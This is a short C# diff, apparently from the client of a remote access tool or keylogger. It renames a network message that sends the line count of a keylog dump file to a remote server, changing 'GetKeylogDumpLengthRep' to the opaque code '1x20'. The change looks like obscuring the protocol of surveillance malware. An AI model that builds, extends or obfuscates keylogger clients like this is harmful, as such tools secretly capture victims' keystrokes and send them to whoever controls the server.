@@ -20,7 +20,7 @@ namespace Client.Core.Events
             {
                 if (NetworkManager.IsConnected)
                 {
-                    NetworkManager.Connection.SendObject("GetKeylogDumpLengthRep",
+                    NetworkManager.Connection.SendObject("1x20",
                         Cryptography.Encrypt(JsonConvert.SerializeObject(File.ReadLines(fullFilePath).Count())));
                 }
                 else
@@ -34,7 +34,7 @@ namespace Client.Core.Events
                 //NO FILE
                 if (NetworkManager.IsConnected)
                 {
-                    NetworkManager.Connection.SendObject("GetKeylogDumpLengthRep",
+                    NetworkManager.Connection.SendObject("1x20",
                         Cryptography.Encrypt(JsonConvert.SerializeObject(0)));
                 }
                 else
